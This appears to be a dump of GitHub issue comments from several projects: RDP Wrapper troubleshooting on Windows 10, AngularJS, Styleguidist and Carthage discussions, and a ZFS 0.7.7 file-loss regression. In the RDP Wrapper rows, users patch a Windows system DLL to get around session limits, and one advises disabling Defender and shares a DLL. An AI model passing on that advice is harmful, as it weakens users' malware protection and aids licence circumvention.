rdpwrap/stascorp/645/458220487,the problem is still the same  Windows version   ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458232249,"It finally works!!! Thank you @friend , your rdpwrap.ini was the solution. Please, explain us what is different in your configuration, because I used offsets @friend posted, but with no success. Respect! ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458244655,@friend your OS version is not *292 ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458334606,"i'm getting what @friend is getting, the listener isn't listening. Same result when i append to the ini file or downloading the ini file that @friend found. Tried restarting the termservice and reboot of the machine, nothing helps. Any ideas? I've verified that my dll file is on version 292 ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458379531,"Do you guys have x86 windows?  I have x64, so never tested x86.  I don't know if anyone tested x86. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458381264,Today everything works. The KB4476976 update was installed RDPWRAP finally works ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458465326,"windows 10 ver. 1809 build 17763.292 all done according to manuals edited .ini windows after reboot RDPConf - all became green Connecting by second user - ""Another user is signed in..."" ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458502955,@friend can you clarify witch Win10 version do you have? Pro or Home?  Win10 Pro 1809 (OS Build 17763.292) and in my RDP folder .dll is not created ( ,False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458511325,"Welcome strange thing after adding the entry from the first post  but printing works, after adding the @friend file, everything works fine except printing Please, do you have any sugestion? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458678178,"Hello. I am simply not able to make it function. I have win 10 pro 17763.292 and everything is green as it should be. I installed the ini file following way. In the install folder i have the ini file prepared before typing rdowinst -i. Everything is acitvated, i checked the ini file in the installation folder, it is the right modified one. When i try to connect it disconnects the local user (lets call him user A) and the screen of the local user changes to the account i have connected to (user B). I dont even get the message that someone will be disconected or that there are too many users. It simply disconnects user A. It would be grateful for any suggestion. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458690076,"@friend sounds like it's working normally. You don't want to log out the current user? Did you uncheck ""Single session per user"" and ""Apply""? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458697317,"Single session per user is unchecked, everything looks good (full green). Version is good. Account ""user A"" is logged. When account ""user B"" connects via remote desktop the screen of the logged ""user A"" turns to account ""user B"". Like Teamviewer. So both users (A+B) share one account. After a clean new install of rdpwrapper i followed the instructions. Admin CMD, stop termservice, replace ini, start termservice, restarted windows unchecked ""singe session per user"" and still only one user possible. Does the dll file also need to be updated sonehow ? ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458699654,"I don't think you need to update the dll, but here is the one from my RDP Wrapper installation folder.  Single session and multiple session works fine for me. I think I did turn off defender (real time protection) during install since chrome was blocking it, I didn't want to risk it.  So maybe do that and uninstall/reinstall rdp wrapper completely. rdpwrap.zip ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/458893824,"Works great, thank you ) I tried it on another computer (windows 10 installation with the same windows build version as the first computer) and it works. I ll simply reinstall windows on the first computer and i am sure it ll work. Thank you once again ) PS It worked instantly on the other ciomputer. Without any problem. ",False,True,False,rdpwrap/stascorp/645
rdpwrap/stascorp/645/459112025,"still have not listening.  I am using ditch's ini and dll.  I have rebooted, reinstalled, etc. Loading configuration... Configuration file c\program files\rdp wrapper\rdpwrap.ini Initializing RDP Wrapper... Base addr  0x00007FFC6B180000 SvcMain    termsrv.dll+0x000000000002BFE0 SvcGlobals termsrv.dll+0x000000000002C870 Version    10.0.17763.292 Freezing threads... Patch CEnforcementCoreGetInstanceOfTSLicense Patch CSessionArbitrationHelperIsSingleSessionPerUserEnabled Patch CDefPolicyQuery Hook CSLQueryInitialize Resumimg threads... &lt;&lt;&lt; SvchostPushServiceGlobals &lt;&lt;&lt; ServiceMain SLInit [0x00007FFC6B26CAB4] bServerSku = 1 SLInit [0x00007FFC6B26CAC4] bRemoteConnAllowed = 1 SLInit [0x00007FFC6B26CAD0] bFUSEnabled = 1 SLInit [0x00007FFC6B26CAC0] bAppServerAllowed = 1 SLInit [0x00007FFC6B26CAC8] bMultimonAllowed = 1 SLInit [0x00007FFC6B26CAB8] lMaxUserSessions = 0 SLInit [0x00007FFC6B26CACC] ulMaxDebugSessions = 0 SLInit [0x00007FFC6B26CAB0] bInitialized = 1 &lt;&lt;&lt; CSLQueryInitialize that is the very last entry in the rdpwrap.txt I can't think of anything else to do to get it to listen.  If I have to I guess I can try and get a pro upgrade for cheap somewhere and see if Win10 Pro is easier to get this working. ",False,True,False,rdpwrap/stascorp/645
angular.js/angular/9004/42364036,"As per AngularJS documentation, each request (cached or not) should return the response with the ""config – {Object} – The configuration object that was used to generate the request."". (  ). But that is not the case, as it's clearly visible on  is basically totally ignoring current request config and returns the cached one (cache miss one). The fix for this is to replace the line above with             cachedResp.then(function (response) {               response.config = config;               return response;             }, function (response) {               response.config = config;               return response;             }).then(removePendingReq, removePendingReq); MORE INFO ON THE REAL USE CASE Our app required an ajax service that would handle different cases  when network timeout occurs, stack the requests and trigger them when network is on when a session token expired, stack the requests, wait for the session token and trigger the requests again  In the above context, we were forced to add our own ""currentRequests"" array and we use a ""requestId"" number to identify the request when it comes back. The problem is that with this cache we are triggering requests 7 and 8 for instance and we get back 7 twice. NOTE I can create a branch and make a pull request with the above fix, if desired. ",False,True,False,angular.js/angular/9004
angular.js/angular/9004/55114260,UPDATE Found out a cleaner solution instead of the 1-line replace solution above. Can anyone please confirm that I could create a pull request for this? Does this seems reasonable? ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/55115094,We also have this problem in our project. Any idea if a fix could be included in one of the 1.3 release candidates? ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/55962702,@friend  do you think it would be reasonable to integrate @friend's PR in one of the 1.3 release candidates? Shall we wait or just manually apply a patch for our product for the weeks to come? ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/56232852,Assigning to @friend as he is dealing with @friend's PR ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/57457648,rc3 is out but this is not merged - any news? ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/59022447,"@friend  / @friend  the PR for this issue is still opened and 1.3.0 was released - we are forced to go in production with an updated version of AngularJS (manually patched it). Is there any way we could consider integrating this soon? Very disappointed of the lack of interest on your side. As community we can only raise bugs and fixed them ourselves, but not having the pro-active attitude towards such an approach, that I cannot understand. ",False,True,False,angular.js/angular/9004
angular.js/angular/9004/59026338,@friend please tone down your comments ,False,True,False,angular.js/angular/9004
angular.js/angular/9004/59028957,"@friend  please mind this issue was labeled with 1.3.0-rc3 and someone forgot to add it. allow me to say that professionally speaking, this is not ok - in business this may cause you lots of trouble (as employer or employee). do you agree? ",False,True,False,angular.js/angular/9004
react-styleguidist/styleguidist/1110/354755295,"I've searched the docs, issues, and Stack Overflow for an answer to this, but I cannot find the answer. How do you enable Hot Module Reloading? ",False,True,False,react-styleguidist/styleguidist/1110
react-styleguidist/styleguidist/1110/416843614,It's enabled by default. What issues do you have? ,False,True,False,react-styleguidist/styleguidist/1110
react-styleguidist/styleguidist/1110/416940661,It isn't working on my project. If I edit a component the entire page reloads ,False,True,False,react-styleguidist/styleguidist/1110
react-styleguidist/styleguidist/1110/416942927,That's how it's supposed to work in Styleguidist. Full HMR would add unnecessary complexity and would be a nightmare to maintain. ,False,True,False,react-styleguidist/styleguidist/1110
react-styleguidist/styleguidist/1110/416944668,This seems like not HMR at all. I don't understand the distinction between this and no HMR. ,False,True,False,react-styleguidist/styleguidist/1110
Carthage/Carthage/2529/344038672,"I've been thinking a lot about #1990 and some of the related issues #1227, #437, etc. Here are my thoughts about the direction that Carthage should take. There are two issues at play  Some framework authors would like to exclude some schemes that aren't meant for public consumption. Examples include schemes that build example projects. Let's call this the framework author problem.  Some framework consumers would like to exclude certain schemes that they're not using—so they don't need to way for them to build. The most extreme example of this is   which bundle all the AWS frameworks in a single repo. Let's call this the framework consumer problem.   These are often conflated, but they are definitely separate issues and need to be considered separately. I also believe it's important to consider the future of Carthage, especially in light of the Swift Package Manager. I believe that  Swift is the future as the primary development language SwiftPM is the future as the primary package manager The future isn't here yet Carthage may be useful for years to come We should start moving towards SwiftPM, planning for its eventual adoption and adapting to it as much as possible.  In the context of the scheme discussion, that means that we need to consider how this works with SwiftPM and find a solution that will work well with it (if we choose to solve it at all).  SwiftPM clearly solves the framework author problem. Its  explicitly lists the schemes that will be built.  SwiftPM doesn't explicitly solve the framework consumer problem, but it could (and maybe even does?) as an optimization. Since SwiftPM builds the whole finished project, not just frameworks, it can detect which targets aren't needed and choose not to build them.   So here's what I think Carthage should do  Work to support SwiftPM packages directly  Use  when bootstrapping. This would potentially let us deprecate s completely, as well as our resolver. If we do need to keep the resolver, I think we could use SwiftPM's. Only build schemes that build targets listed in . This would solve the framework author problem.   Optionally add scheme whitelisting that mirrors the build targets listed in . The only reason to do this would be if we believe that SwiftPM adoption won't be fast enough.  Explicitly don't solve the framework consumer problem. This is an optimization that adds complexity and requires more design. (The implementation in #1990 is insufficient.) Leave this for Xcode and SwiftPM to solve down the road.   I'm going to lock this discussion because I don't want it derailed by non-members. But I'd love to hear from @friend/carthage to know what people think. ",False,True,False,Carthage/Carthage/2529
Carthage/Carthage/2529/407570456,"I am very new to the project and I am grateful to be able to contribute to Carthage and have the chance to express my opinion. I have started using Carthage when it was in it's infancy and I feel very attached to it. It's a tool I love and endless source of learning opportunities for me. As much as I want this to be true, it don't think it will. See Maven &amp; Gradle, Cabal &amp; Stack and the countess Javascript build tools. Just my two cents. Yes, so I think being pragmatic here is paramount Agreed Yes.  In the mean time though the community needs a solution, Swift build times are overall excruciating. A few solutions I see are  Clone problematic repos and delete the unwanted schemes. This is high maintenance for the users. Think of agencies. 6 month and everyone is out of the project. Now the client has to maintain the fork someone else made. Accept #1990 with changes to the problematic parts. Carthage provides hooks to run scripts at certain points of the cycle Exclude schemes via custom carthage variables passed in via   Definitely. However I think Carthage can be more. Also SwiftPM has no support for iOS, tvOS, or watchOS. From the github readme Ok. Good idea. This might be a long way down the road and it might not happen at all. #1990 is not perfect, I agree on that. I also think that contributors are more than willing to fix it though. More specifically  lack of project &lt;-&gt; scheme association (but hey, if you call your scheme  ... you're kind of asking for it) use of custom format for the ignore (would prefer YAML or json)  Overall I think that this is a very real problem. Just like the  the blacklisting does not travel upwards so there is no risk for other consumers. It's it true that this might not me a Carthage problem to solve, but I would also say that there are many other problems, starting with the last of strict rules on how developers set up their projects, that carthage makes it's own. The complexity added by this change is negligible in my opinion. If users want to shoot themselves in the foot by misusing the feature and excluding schemes needed by some transitive dependency, I think carthage should let them do so. The tool should not prevent a behavior, in my opinion desirable, just because it could be misused. In the end one can always . ",False,True,False,Carthage/Carthage/2529
Carthage/Carthage/2529/409582986,"I think it might make more sense to explicitly list schemes that you are using if we really want to do this If no schemes are listed, then all would be built. This seems like it's more inline with with SwiftPM does, which would let us move more towards it in the future. It also solves the issue where schemes aren't tied to dependencies. The biggest issue would be to find the correct file format. OGDL was been suggested in the past. That might make sense here if we're going to extend. ",False,True,False,Carthage/Carthage/2529
zfs/zfsonlinux/7401/312114336,"System information  Type                                | Version/Name   ---                                  |     ---  Distribution Name       | Scientific Linux Distribution Version    | 6.8 Linux Kernel                 | 2.6.32-696.23.1.el6.x86_64 Architecture                 | x86_64 ZFS Version                  | 0.7.7 SPL Version                  | 0.7.7 Describe the problem you're observing Data loss when copying a directory with large-ish number of files. For example,  with 10000 files in SRC is likely to result in a couple of ""cp cannot create regular file cpcat DST/FOOecho 3 &gt; /proc/sys/vm/drop_caches reports N fewer hard links than SRC, where N is the number of files for which  reported ""No space left on device"" error. Names of missing files are mostly predictable if SRC is small. Scrub does not find any errors. Describe how to reproduce the problem Include any warning/errors/backtraces from the system logs ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379404598,I can confirm the same behavior on a minimal CentOS 7.4 installation (running inside VirtualBox) and latest ZFS 0.7.7. The problem does NOT appear on ZoL 0.7.6 ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379411966,We are also seeing similar behavior since the install of 0.7.7 ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379434208,"I have a hand-built ZoL 0.7.7 on a stock Ubuntu 16.04 server (currently with Ubuntu kernel version '4.4.0-109-generic') and I can't reproduce this problem on it, following the reproduction here and some variants (eg using 'seq -w' to make all of the filenames the same size). The pool I'm testing against has a single mirrored vdev. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379454983,"One more data point, with the hope that it helps narrow down the issue. I cannot reproduce the issue on the few machines I have here, neither with 10k files, nor with 100k or even 1M. They all have very similar configuraition. They use a single 2-drive mirrored vdev. The drives are Samsung SSD 950 PRO 512GB (NVMe, quite fast). ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379458689,I get a worse situation on latest Centos 7 with kmod ♠[root@friend test]# mkdir SRC [root@friend test]# for i in $(seq 1 10000); do echo $i &gt; SRC/$i ; done [root@friend test]# cp -r SRC DST cp cannot create regular file ‘DST/5269’ No space left on device cp cannot create regular file ‘DST/9923’ No space left on device [root@friend test]# cat DST/5269 cat DST/5269 No such file or directory [root@friend test]# cat DST/9923 cat DST/9923 No such file or directory [root@friend test]# cat DST/9924 9924 [root@friend test]# cat DST/9923 cat DST/9923 No such file or directory [root@friend test]# ls -l DST/9923 ls cannot access DST/9923 No such file or directory [root@friend test]# zpool status   pool storage  state ONLINE   scan none requested config NAME                                            STATE     READ WRITE CKSUM storage                                         ONLINE       0     0     0   raidz1-0                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30KPM0D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJDDD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJAHD  ONLINE       0     0     0   raidz1-1                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NGXDD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJ91D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30LN7GD  ONLINE       0     0     0   raidz1-2                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJM5D  ONLINE       0     0     0     ata-HGST_HUS724020ALA640_PN2134P5GAY9PX     ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJD5D  ONLINE       0     0     0   raidz1-3                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJD8D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJHVD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30K5PMD  ONLINE       0     0     0   raidz1-4                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NLZLD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30MVW4D  ONLINE       0     0     0     ata-HGST_HUS724020ALA640_PN2134P5GBBL9X     ONLINE       0     0     0 logs   mirror-5                                      ONLINE       0     0     0     nvme0n1p1                                   ONLINE       0     0     0     nvme1n1p1                                   ONLINE       0     0     0 cache   nvme0n1p2                                     ONLINE       0     0     0   nvme1n1p2                                     ONLINE       0     0     0`  I ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379460489,@friend Did you use empty files? Please try the following  cd into your ZFS dataset execute  now issue   Thanks. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379486565,"I used the exact commands from the OP (which create non-empty files), only changing 10000 to 100000 and 1000000. But for completeness, I tried yours as well. The few data points above weakly hint at raidz, since no one was able to reproduce on mirrors so far. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379490740,"On one of my pools this works fine, on another it exhibits the problems.  Both pools belong to the same root pool. bash-4.2$ mkdir SRC bash-4.2$ for i in $(seq 1 10000); do echo $i &gt; SRC/$i ; done bash-4.2$ cp -r SRC DST cp cannot create regular file ‘DST/222’ No space left on device cp cannot create regular file ‘DST/6950’ No space left on device On beast/engineering the above commands run without issue.  On beast/dataio they fail. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379491047,I think the issue is related to primarycache=all.  If I set a pool to have primarycache=metadata there are no errors. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379492172,"@friend I replicated the issue with a simple, single-vdev pool. I'll try and report back with mirror, anyway. @friend What pool/vdev layout do you use? Can you show  on both machines? I tried with primarycache=none and it failed, albeit with much lower frequency (ie it failed after the 5th copy). I'll try with primarycache=metadata. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379492263,"Same machine, different dataset on the same pool. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379492879,"@friend what's the HW config of this system - how much RAM, what model of x86_64 CPU? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379495948,"I can confirm this bug on a mirrored zpool. It is a production system so I didn't do much testing before downgrading to 0.7.6 pool ssdzfs-array state ONLINE status Some supported features are not enabled on the pool. The pool can     still be used, but some features are unavailable. [it is at the 0.6.5.11 features level] action Enable all features using 'zpool upgrade'. Once this is done,     the pool may no longer be accessible by software that does not support     the features. See zpool-features(5) for details.   scan scrub repaired 0B in 0h16m with 0 errors on Sun Apr  1 014659 2018 config NAME                                     STATE     READ WRITE CKSUM ssdzfs-array                             ONLINE       0     0     0   mirror-0                               ONLINE       0     0     0     ata-XXXX-enc  ONLINE       0     0     0     ata-YYYY-enc  ONLINE       0     0     0   mirror-1                               ONLINE       0     0     0     ata-ZZZZ-enc  ONLINE       0     0     0     ata-QQQQ-enc  ONLINE       0     0     0  errors No known data errors $zfs create ssdzfs-array/tmp $(run test as previously described; fails about 1/2 the time) $uname -a Linux MASKED 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 190337 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux I have attempted to reproduce the bug on 0.7.6 without success. Here is an except of one of the processor feature levels processor    3 vendor_id    GenuineIntel cpu family   6 model        26 model name   Intel(R) Core(TM) i7 CPU         920  @ 2.67GHz stepping     5 microcode    0x19 cpu MHz      1600.000 cache size   8192 KB physical id  0 siblings     4 core id      3 cpu cores    4 apicid       6 initial apicid   6 fpu      yes fpu_exception    yes cpuid level  11 wp       yes flags        fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc aperfmperf pni dtes64 monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm sse4_1 sse4_2 popcnt lahf_lm tpr_shadow vnmi flexpriority ept vpid dtherm ida bogomips     5333.51 clflush size     64 cache_alignment  64 address sizes    36 bits physical, 48 bits virtual power management [    1.121288] microcode CPU3 sig=0x106a5, pf=0x2, revision=0x19 ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379501782,"I still get it with primarycache=metadata, on the first attempt to cp ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379506938,For those that have upgraded to the 0.7.7 branch - is it advisable to downgrade back to 0.7.6 until this regression is resolved? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379509313,What is the procedure to downgrade ZFS on CentOS 7.4? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379514720,"For reverts, I usually do $yum history  (identify transaction that installed 0.7.7 over 0.7.6; yum history info XXX can be used to confirm) $ yum history undo XXX (where XXX is the transaction number identified in the previous step) Note that with dkms installs, after reverts, I usually find I need to $dkms remove zfs/0.7.6 -k  $dkms remove spl/0.7.6 -k  $dkms install spl/0.7.6 -k  --force $dkms install zfs/0.7.6 -k  --force To make sure all modules are actually happy and loadable on reboot. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379531805,Is this seen with rsync instead of cp? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379547362,"I'm not able to reproduce this, and I have several machines (Debian unstable; 0.7.7, Linux 4.15). Can people also include ? Maybe the kernel version is playing a role? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379550690,"Ok, I've done some more tests. System is CentOS 7.4 x86-64 with latest available kernel  single vdev pool reproduced mirrored pool reproduced kmod and dkms reproduced compiled from source [1] reproduced compression lz4 and off reproduced primary cache all, metadata and none reproduced  On a Ubuntu Server 16.04 LTS with compiled 0.7.7 spl+zfs (so not using the repository version), I can not reproduce the error. As a side note, compiling on Ubuntu does not give any warning. So, the problem seems confined in CentOS/RHEL territory. To me, it seems a timing/racing problem (possibly related to the ARC) anything which increases copy time lowers the error probability/frequency. Some example of action which lower the fail rate  (it copies file attributes) disabling cache copy from SRC on another filesystem (eg root XFS). Note this seems to completely avoid the problem.  [1] compilation give the following warning ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379551270,"@friend I'm sorry, I'm having a lot of trouble tracking this piece of information down. What Linux kernel version is Centos 7.4 on? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379552009,"Greetings, I have mirrors with the same problem. Scientific Linux 7.4 (fully updated) zfs-0.7.7 from zfsonlinux.org repos The output of my yum install I am using rsnapshot to do backups. It is when it runs the equivalent to below that issues come up. There's plenty of space For those that want to know my hardware, the system is a AMD X2 255 processor with 8GB of memory (so far more than enough for my home backup system). I can revert today, or I can help test if someone needs me to try something. Just let me know. Thanks! ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379552574,Can someone who can repro this try bisecting the changes between 0.7.6 and 0.7.7 so we can see which commit breaks people? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379552932,Most likely  seems to be a race condition in the mzap-&gt;fzap upgrade phase. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379553111,"@friend this, uh, seems horrendous enough that unless someone volunteers a fix for the race Real Fast, a revert and cutting a point release for this alone seems like it would be merited, to me at least. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379553197,@friend I can try later today. I'm meeting some friends for lunch and will be gone for a few hours but I'm happy to help how I can when I get back. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379553376,"@friend if you do, it's probably worth trying with and without the commit @friend pointed to, rather than letting the bisect naturally find it. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379553960,From what we have seen so far it certainly seems to only affect older (by which I mean lower-versioned) kernels. I have not been able to reproduce the issue on Linux 4.15 (Fedora). ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379558073,"@friend @friend any clue on why it affect 3.x kernels only, while 4.x seems immune? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379559299,"BTW, I bisected it, and couldn't repro it on CentOS 7 with 3.10.0-693.21.1 on eb9c453 but could on cc63068, so that does appear to be the cause. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379559840,"I haven't done any testing yet, but I very much appreciate the speed at which you've found the commit, rincebrain! Since seeing this issue raised, I've been quite nervous, and I don't yet know if I'm affected. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379573246,"Since this seems to be FRAME_POINTER-specific (unless anyone's got a counter-example), I would guess this is #5041 2.0 Elec boogalootric ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379573786,fwiw anything other than  is going to have problems with CPU overhead and I/O timeouts for lots of client accesses.. ZFS's insensitive/mixed lookup is really 'stupid'. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379573877,"Thanks @friend for confirming! Since this is just my personal-at-home system, I don't mind leaving it in its reproducible state if anyone wants me to test something later in the week. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379592002,"@friend this one is kind of scary, can you take a look? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379601501,"@friend Yes, I've been following this one but haven't looked into it at all.  Has this for sure been narrowed down to cc63068e95ee725cce03b1b7ce50179825a6cda5?  This is clearly something that has to get fixed right away. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379602540,"@friend I couldn't readily repro it on CentOS 7 x86_64 on the commit before cc63068, and could easily repro it on cc63068, same SPL both times. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379602972,"cc63078 causes  to try only twice to expand (split) a zap leaf block for a directory when adding a new entry would overflow the existing leaf. This is sufficient for handling a colliding name when  is set, but appears to bails out too early (with ) when the zap for the directory grows past a certain size. When  fails, it rolls back the transaction so the znode for the new file is removed. So far, this is undesirable but doesn't result in data loss per se, since the system just refused to create new files. My hypothesis is that a subsequent s is successful as the directory's zap has already grown (as long as one to two additional leaf splits is sufficient to fit the new entry), but the subsequent zap expansions and the new znodes are being discarded, due to a side effect of the previous rollback (possibly closing the transaction there). The vfs page cache still reflects the new files but they're not present in ARC (or committed to disk), hence flushing the cache makes them go away. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379621112,"I have masked 0.7.7 in Gentoo based on this issue.  have cleared my schedule for tomorrow so that I have time to spend on this. I'd say more, but this blind sided me and it is too late at night for me to start looking into it now. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379623951,"Ok, so the expand retry limit 2 is not enough. In fact, there shouldn't be a limit at all until we hit the limit of ZAP itself. The reason you can create a ZAP will a lot of file but cannot copy is because, when you create file, you create file randomly in terms of hash value. However, if you copy files from one directory to another directory, you create file sequentially in terms of hash value. That means if the source directory expanded its leaves 6 times, you need to expand the destination leaves 6 times in one go. One thing to note is that we do use different salt for different directory, so theoretically, a strong enough salt should prevent this from happening. This shows that the current salt is not strong enough. To remove the expand limit, try removing this if block.  file missing afterward is a strange issue. I'll have to investigate to see what happened. I don't think there's any transaction rollback in the error path. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379624619,Getting rid of the limit doesn't panic the box when running the  ZTS group and seems to prevent this issue Now testing kernel 3.10.x on Debian 8 with the same Kconfig from previous CentOS7 box ... ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379628367,"I can confirm the ENOSPC (No space left on device) is coming from  when we hit the retry limit, running the reproducer under the following stap script ` relevant output ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379641436,"Well, i could not reproduce this running CentOS7 kernel on Debian8 but using its  On CentOS7, testing also with  from Debian8 On Debian8, with  from CentOS7 We may need to find a better reproducer than ""cp"" for the regression test proposed in #7411. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379761845,"This update is still being offered when systems do a ""yum update""; given the serious nature of this bug, should the update not be pulled, leaving 0.7.6 as the latest available version? Today is a day when I'm EXTREMELY glad I have ZFS/SPL updates blocked and do them manually during designated downtime windows or otherwise more convenient times. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379821060,"@friend @friend is the maintainer for RHEL-based systems and he just got into the office. He likely does not even know about this yet. I'll give him a call to let him know so that he can take the update out of the RPM repository. Thanks for pointing it out. @friend pointed out to me in IRC that it could be that this is mainly reproducible only on RHEL-based systems because they use xattr=sa to speed up SELinux's handling of filesystem labels. The xattr=sa could be related or not. I had a late start on this today, so I am not certain either way at this point, but I think that he made a good point that the interaction with  should be considered. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379824224,@friend same problem occurs with . ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379824235,@friend I spoke to Brian. He just learned about this in something like the past hour. The tentative plan is to pull 0.7.7 from the RPM repository and push out 0.7.8 with a revert of cc63068e95ee725cce03b1b7ce50179825a6cda5. He is going to have a chat with @friend before he finalizes the plan to deal with this. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379824494,@friend Thanks for that information. That helps narrow things down. ) ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379826067,@friend Is there any risk that data created with 0.7.7 on CentOS will be corrupted/disappear with the fix in 0.7.8?? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379827550,"@friend My tentative understanding is that If ENOSPC did not occur, the data should be fine. I suggest downgrading to 0.7.6 for the time being though. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379828303,"Would people who can/cannot reproduce this issue post this information about the system?  Reproducibility (yes or no) Distribution name and version Kernel Version Coreutils Version SELinux status (enforcing, permissive, off/unused)  ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379831142,"For those who need them, here are links to the RPM packages for coreutils on CentOS 6 and CentOS 7  on how to extract them are here  just mentioned in IRC that he tested  from Gentoo, Debian 8 and CentOS 7 on Gentoo Hardened. He was unable to reproduce this with the Gentoo and Debian  binaries, but could with the CentOS 7 one. ",False,True,False,zfs/zfsonlinux/7401
